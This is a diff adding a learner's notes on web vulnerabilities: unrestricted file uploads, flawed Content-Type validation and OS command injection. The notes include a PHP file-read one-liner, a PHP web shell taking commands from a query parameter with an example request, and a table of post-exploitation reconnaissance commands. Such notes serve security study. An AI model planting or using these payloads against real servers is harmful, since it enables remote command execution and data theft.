@@ -83,3 +83,86 @@ Bypassing 2FA
  - server-side applications
  - changing the internal API
  - change it to http://localhost/admin
+
+
+
+>>>... 5) File upload vulnerabilities
+
+1) Exploiting unrestricted file uploads to deploy a web shell
+
+- PHP one-liner could be used to read arbitrary files from the server's filesystem
+<?php echo file_get_contents('/path/to/target/file'); ?>
+
+Once uploaded, sending a request for this malicious file will return the target file's contents in the response. 
+
+- WEB SHELL SCRIPT
+<?php echo system($_GET['command']); ?>
+
+- The above script enables you to pass an arbitrary system command via a query parameter as follows: 
+GET /example/exploit.php?command=id HTTP/1.1 
+
+
+
+2) Flawed file type validation
+- For simple form submission
+content-type : appplication/x-www-form-urlencoded
+
+- For large amounts of binary data
+content-type : multipart/form-data
+
+
+-NOTE:
+In multipart/form-data, the message body is split into separate parts, one for each form input.
+
+Each part contains:
+Content-Disposition → identifies the input field and filename (if applicable).
+Content-Type → specifies the MIME type of the submitted data.
+
+MIME -> A MIME type tells the server what kind of data a file contains.
+FOR Example:
+File	       MIME type
+photo.jpg	   image/jpeg
+photo.png	   image/png
+document.pdf   application/pdf
+file.txt	   text/plain
+data.json	   application/json
+
+
+**Practical takeaway**:
+- In a file upload, check 3 things:
+
+Filename       → photo.jpg
+MIME type      → image/jpeg
+Actual content → Is it really a JPEG?
+
+A flawed file type validation occurs when:
+- The server trusts the Content-Type header without checking the actual file contents.
+
+In Burp: modify the uploaded file's Content-Type and see whether the server accepts a file that doesn't actually match that type.
+
+
+
+
+
+
+>>>... 6) OS Command Injection
+- it occurs when an application allows user input to be executed as an OS command on the server.
+
+It can allow an attacker to:
+Execute unauthorized commands.
+Access or modify server data.
+Potentially compromise the server and other connected systems.
+
+In simple terms:
+User input → Application → OS command → Attacker's command gets executed.
+
+- COMMANDS:
+
+Purpose of command  	Linux 	        Windows
+Name of current user 	whoami 	        whoami
+Operating system 	    uname -a        ver
+Network configuration 	ifconfig        ipconfig /all
+Network connections 	netstat -an 	netstat -an
+Running processes 	    ps -ef 	        tasklist 
+
+> Injecting OS commands
